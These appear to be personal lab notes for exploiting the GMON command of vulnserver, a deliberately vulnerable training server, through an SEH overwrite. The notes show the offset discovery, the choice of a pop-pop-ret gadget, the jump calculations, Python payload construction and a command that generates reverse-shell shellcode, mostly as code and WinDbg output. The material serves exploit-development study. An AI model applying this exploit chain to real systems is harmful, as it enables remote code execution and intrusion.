# GMON

IDA PRO: GMON must contain a /

```asm
cmp     byte ptr [eax], 2Fh ; '/'
```

Sent 6000 A's
Program crashed, but As not in EIP. SEH handle exception. Continue execution

```text
0:000> g
ModLoad: 745e0000 74636000   C:\Windows\system32\mswsock.dll
(1820.1c10): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=7efefefe ebx=000000d4 ecx=00a5465c edx=41414141 esi=00401848 edi=00e60000
eip=76e46819 esp=00e5f1d0 ebp=00e5f9c0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
msvcrt!strcat+0x89:
76e46819 8917            mov     dword ptr [edi],edx  ds:0023:00e60000=????????
0:003> g
(1820.1c10): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=76f265c0 esi=00000000 edi=00000000
eip=41414141 esp=00e5ec80 ebp=00e5eca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
```

Sent 6000 character pattern

```txt
0:000> g
ModLoad: 745e0000 74636000   C:\Windows\system32\mswsock.dll
(181c.14d4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=7efefee0 ebx=000000d4 ecx=0098465c edx=31714530 esi=00401848 edi=008e0000
eip=76e46819 esp=008df1d0 ebp=008df9c0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
msvcrt!strcat+0x89:
76e46819 8917            mov     dword ptr [edi],edx  ds:0023:008e0000=????????
0:001> g
(181c.14d4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=356f4534 edx=76f265c0 esi=00000000 edi=00000000
eip=356f4534 esp=008dec80 ebp=008deca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
356f4534 ??              ???

```

#### Pattern offset

```bash
uv run python3 gmon_exploit.py --target-ip 192.168.1.114 --target-port 9999 -l 6000 --endianness little --newline --crlf -v
```

```text
0:001> .scriptload \users\dooley\documents\osed\osed.js
JavaScript script successfully loaded from 'C:\users\dooley\documents\osed\osed.js'
0:001> dx @$osed().pattern_offset(0x356f4534)

=== Pattern Offset ===
[+] Format: msf
[+] Needle: 4Eo5
[+] Offset: 3554
Why this matters for exploitation: Exact offset maps crash control to payload layout and exploit reliability.
@$osed().pattern_offset(0x356f4534) : true
```


Sending Bs and Cs into nseh and seh

```python
    prefix = b"GMON /"
    buffer = b"A" * 3550
    nseh = pack("<L", 0x42424242)
    seh = pack("<L", 0x43434343)
    extra = b"D" * 1000
```


Windbg:
```txt
0:000> g
ModLoad: 745e0000 74636000   C:\Windows\system32\mswsock.dll
(1424.1b88): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=78f8f8f8 ebx=000000a0 ecx=00b9465c edx=44444444 esi=00401848 edi=00a00000
eip=76e46819 esp=009ff1d0 ebp=009ff9c0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
msvcrt!strcat+0x89:
76e46819 8917            mov     dword ptr [edi],edx  ds:0023:00a00000=????????
0:001> g
(1424.1b88): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=43434343 edx=76f265c0 esi=00000000 edi=00000000
eip=43434343 esp=009fec80 ebp=009feca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
43434343 ??              ???
```

No bad chars present other than \x00


## Look for pop, pop, ret

```text
0:003> dx @$osed().seh_ppr()

=== SEH PPR Candidates ===
Rank    Address             Module                                            Offset        Instructions              BadChar   ASLR      SafeSEH   Score 
------  ------------------  ------------------------------------------------  ------------  ------------------------  --------  --------  --------  ------
1       0x625011B3          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x11B3        pop eax ; pop eax ; ret   safe      disabled  disabled  90    
2       0x625011EF          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x11EF        pop ecx ; pop eax ; ret   safe      disabled  disabled  90    
3       0x625011FB          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x11FB        pop eax ; pop edx ; ret   safe      disabled  disabled  90    
4       0x7510D046          C:\Windows\System32\KERNELBASE.dll                0xFD046       pop eax ; pop esi ; ret   safe      enabled   enabled   -25   
5       0x751331D5          C:\Windows\System32\KERNELBASE.dll                0x1231D5      pop eax ; pop ebx ; ret   safe      enabled   enabled   -25   
6       0x75160DBC          C:\Windows\System32\KERNELBASE.dll                0x150DBC      pop eax ; pop esi ; ret   safe      enabled   enabled   -25   
7       0x7516EFFD          C:\Windows\System32\KERNELBASE.dll                0x15EFFD      pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
8       0x7516F00D          C:\Windows\System32\KERNELBASE.dll                0x15F00D      pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
9       0x751CA02F          C:\Windows\System32\KERNELBASE.dll                0x1BA02F      pop eax ; pop esi ; ret   safe      enabled   enabled   -25   
10      0x751CA2DD          C:\Windows\System32\KERNELBASE.dll                0x1BA2DD      pop eax ; pop ecx ; ret   safe      enabled   enabled   -25   
11      0x751D0792          C:\Windows\System32\KERNELBASE.dll                0x1C0792      pop eax ; pop esi ; ret   safe      enabled   enabled   -25   
12      0x75569F75          C:\Windows\System32\KERNEL32.DLL                  0x59F75       pop eax ; pop ebx ; ret   safe      enabled   enabled   -25   
13      0x75584AE1          C:\Windows\System32\KERNEL32.DLL                  0x74AE1       pop eax ; pop esi ; ret   safe      enabled   enabled   -25   
```

When Windows calls the exception handler:

```text
ESP →  return address into exception dispatcher
       ExceptionRecord
       EstablisherFrame
       ContextRecord
       DispatcherContext
```

```text
[ESP+00]  ReturnAddress
[ESP+04]  ExceptionRecord
[ESP+08]  EstablisherFrame
[ESP+0C]  ContextRecord
[ESP+10]  DispatcherContext
```

```txt
0:003> dds esp L5
00dbec80  76f265a2 ntdll!ExecuteHandler2+0x26
00dbec84  00dbed80
00dbec88  00dbffcc   <- EstablisherFrame (address of the Next field nSEH)
00dbec8c  00dbed9c
00dbec90  00dbed0c
```

The exact registers being popped usually do not matter, provided neither instruction introduces a problematic side effect such as POP ESP.

function prototype
```c
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,
    IN OUT PCONTEXT ContextRecord, 
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
);
```

`EstablisherFrame` contains buffer (shellcode and badchars)

```text
0:003> db 00dbffcc
00dbffcc  42 42 42 42 43 43 43 43-01 02 03 04 05 06 07 08  BBBBCCCC........
00dbffdc  0b 0c 0e 0f 10 11 12 13-14 15 16 17 18 19 1a 1b  ................
00dbffec  1c 1d 1e 1f 21 22 23 24-27 28 29 2a 2c 2d 2e 2f  ....!"#$'()*,-./
00dbfffc  30 31 32 33 ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  0123????????????
00dc000c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00dc001c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00dc002c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00dc003c  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
```

```text
0:003> !exchain
00dbec94: ntdll!ExecuteHandler2+44 (76f265c0)
00dbffcc: 43434343
0:003> dd 00dbffcc L2
00dbffcc  42424242 43434343
```

Memory Layout is:

```text
00dbffcc  42 42 42 42    Next / nSEH
00dbffd0  43 43 43 43    Handler / SEH
```

```text
0:003> dx @$osed().seh_ppr("essfunc")

=== SEH PPR Candidates ===
Rank    Address             Module                                            Offset        Instructions              BadChar   ASLR      SafeSEH   Score 
------  ------------------  ------------------------------------------------  ------------  ------------------------  --------  --------  --------  ------
1       0x625010B4          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x10B4        pop ebx ; pop ebp ; ret   safe      disabled  disabled  90    
2       0x625011B3          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x11B3        pop eax ; pop eax ; ret   safe      disabled  disabled  90    
3       0x625011BF          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x11BF        pop ebx ; pop ebx ; ret   safe      disabled  disabled  90    
4       0x625011CB          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x11CB        pop ebp ; pop ebp ; ret   safe      disabled  disabled  90    
5       0x625011D7          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x11D7        pop ebx ; pop ebx ; ret   safe      disabled  disabled  90    
6       0x625011E3          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x11E3        pop ecx ; pop edx ; ret   safe      disabled  disabled  90    
7       0x625011EF          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x11EF        pop ecx ; pop eax ; ret   safe      disabled  disabled  90    
8       0x625011FB          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x11FB        pop eax ; pop edx ; ret   safe      disabled  disabled  90    
9       0x6250120B          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x120B        pop ecx ; pop ecx ; ret   safe      disabled  disabled  90    
10      0x6250160A          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x160A        pop esi ; pop ebp ; ret   safe      disabled  disabled  90    
11      0x6250172B          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x172B        pop edi ; pop ebp ; ret   safe      disabled  disabled  90    
12      0x6250195E          C:\Users\dooley\Documents\vulnserver\essfunc.dll  0x195E        pop edi ; pop ebp ; ret   safe      disabled  disabled  90    
Why this matters for exploitation: Reliable pop-pop-ret selection is central to practical SEH overwrite exploitation.
@$osed().seh_ppr("essfunc") : true
```

Now replace the Cs with `0x625011B3` (`pop eax ; pop eax ; ret`)

Set breakpoing at `0x625011B3`

```text
0:000> bp 0x625011B3
0:000> g
ModLoad: 745e0000 74636000   C:\Windows\system32\mswsock.dll
(1aac.11a8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=7efcfef8 ebx=000000d4 ecx=001b465c edx=37363534 esi=00401848 edi=00dc0000
eip=76e46819 esp=00dbf1d0 ebp=00dbf9c0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
msvcrt!strcat+0x89:
76e46819 8917            mov     dword ptr [edi],edx  ds:0023:00dc0000=????????
0:003> g
Breakpoint 1 hit
eax=00000000 ebx=00000000 ecx=625011b3 edx=76f265c0 esi=00000000 edi=00000000
eip=625011b3 esp=00dbec80 ebp=00dbeca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
essfunc!EssentialFunc2+0x7:
625011b3 58              pop     eax
0:003> r eip
eip=625011b3
0:003> r esp
esp=00dbec80
0:003> dd esp L6
00dbec80  76f265a2 00dbed80 00dbffcc 00dbed9c
00dbec90  00dbed0c 00dbffcc
0:003> !exchain
00dbec94: ntdll!ExecuteHandler2+44 (76f265c0)
00dbffcc: essfunc!EssentialFunc2+7 (625011b3)
Invalid exception stack at 42424242
```

```text
ESP = 00dbec80

00dbec80  76f265a2   ← first POP consumes this
00dbec84  00dbed80   ← second POP consumes this
00dbec88  
```

```text
pop eax   → discard 76f265a2
pop ???   → discard 00dbed80
ret       → load 00dbffcc into EIP
```

```text
0:003> t
eax=76f265a2 ebx=00000000 ecx=625011b3 edx=76f265c0 esi=00000000 edi=00000000
eip=625011b4 esp=00dbec84 ebp=00dbeca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
essfunc!EssentialFunc2+0x8:
625011b4 58              pop     eax
0:003> r eax
eax=76f265a2
0:003> r esp 
esp=00dbec84
0:003> r eip
eip=625011b4
0:003> u eip L2
essfunc!EssentialFunc2+0x8:
625011b4 58              pop     eax
625011b5 c3              ret
```


```text
0:003> t
eax=00dbed80 ebx=00000000 ecx=625011b3 edx=76f265c0 esi=00000000 edi=00000000
eip=625011b5 esp=00dbec88 ebp=00dbeca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
essfunc!EssentialFunc2+0x9:
625011b5 c3              ret
0:003> r eax
eax=00dbed80
0:003> r eip
eip=625011b5
0:003> r esp
esp=00dbec88
0:003> dd esp L4
00dbec88  00dbffcc 00dbed9c 00dbed0c 00dbffcc
0:003> u eip L1
essfunc!EssentialFunc2+0x9:
625011b5 c3              ret
0:003> r
eax=00dbed80 ebx=00000000 ecx=625011b3 edx=76f265c0 esi=00000000 edi=00000000
eip=625011b5 esp=00dbec88 ebp=00dbeca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
essfunc!EssentialFunc2+0x9:
625011b5 c3              ret
0:003> t
eax=00dbed80 ebx=00000000 ecx=625011b3 edx=76f265c0 esi=00000000 edi=00000000
eip=00dbffcc esp=00dbec8c ebp=00dbeca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
00dbffcc 42              inc     edx
0:003> r eip
eip=00dbffcc
0:003> r esp
esp=00dbec8c
0:003> db eip L8
00dbffcc  42 42 42 42 b3 11 50 62                          BBBB..Pb
0:003> u eip L4
00dbffcc 42              inc     edx
00dbffcd 42              inc     edx
00dbffce 42              inc     edx
00dbffcf 42              inc     edx
```

Note:
```text
Address      Bytes

00dbffcc     42 42 42 42    ← Next (nSEH)
00dbffd0     b3 11 50 62    ← Handler (SEH)
```


Shellcode:
```bash
uv run emitter --template reverse_shell --lhost 192.168.1.162 --lport 9001 Tools/emitter/manifests/revshell.yaml
```

```python
    prefix = b"GMON /"
    buffer = b"A" * (3550 - len(shellcode) - 500 - 4)
    nop = b"\x90" * 4
    buffer_end = b"A" * 500
    nseh = pack("<L", 0x04EB9090)  # 8 byte jump
    seh = pack("<L", 0x625011B3)  # pop eax; pop eax; ret
    jump_backwards = b"\xe9\x17\x42\x8b\xff"
    extra = b"D" * (
        5200 - len(buffer) - len(nop) - len(shellcode) - len(nseh) - len(seh) - len(nop)
    )
    payload = (
        prefix
        + buffer
        + nop
        + shellcode
        + buffer_end
        + nseh
        + seh
        + nop
        # + jump_backwards
        + b"\xcc" * 8
        + extra
    )
```


```text
0:003> t
eax=00e4ed80 ebx=00000000 ecx=625011b3 edx=76f265c0 esi=00000000 edi=00000000
eip=00e4ffd4 esp=00e4ec8c ebp=00e4eca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
00e4ffd4 90              nop
0:003> t
eax=00e4ed80 ebx=00000000 ecx=625011b3 edx=76f265c0 esi=00000000 edi=00000000
eip=00e4ffd5 esp=00e4ec8c ebp=00e4eca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
00e4ffd5 90              nop
0:003> t
eax=00e4ed80 ebx=00000000 ecx=625011b3 edx=76f265c0 esi=00000000 edi=00000000
eip=00e4ffd6 esp=00e4ec8c ebp=00e4eca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
00e4ffd6 90              nop
0:003> t
eax=00e4ed80 ebx=00000000 ecx=625011b3 edx=76f265c0 esi=00000000 edi=00000000
eip=00e4ffd7 esp=00e4ec8c ebp=00e4eca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
00e4ffd7 90              nop
0:003> t
eax=00e4ed80 ebx=00000000 ecx=625011b3 edx=76f265c0 esi=00000000 edi=00000000
eip=00e4ffd8 esp=00e4ec8c ebp=00e4eca0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
00e4ffd8 cc              int     3
0:003> s -b 0 L?8000000 90 90 90 90 eb 33
007041f4  90 90 90 90 eb 33 31 c9-64 8b 41 30 8b 40 0c 8b  .....31.d.A0.@..
00e4fb9c  90 90 90 90 eb 33 31 c9-64 8b 41 30 8b 40 0c 8b  .....31.d.A0.@..
```

Want a relative jump:
```txt
jump starts:       00e4ffd8
next instruction:  00e4ffdd
target:            00e4fb9c
```

Note: jmp instruction is 5 bytes

```text
displacement = 00e4fb9c - 00e4ffdd
             = -0x441
               -0x441 = 0xFFFFFBBF
```

```python
jump_back = b"\xE9\xBF\xFB\xFF\xFF"
```

```text
00e4ffd8  E9 BF FB FF FF
          |
          +-- CPU finishes decoding at 00e4ffdd

00e4ffdd + (-0x441) = 00e4fb9c
```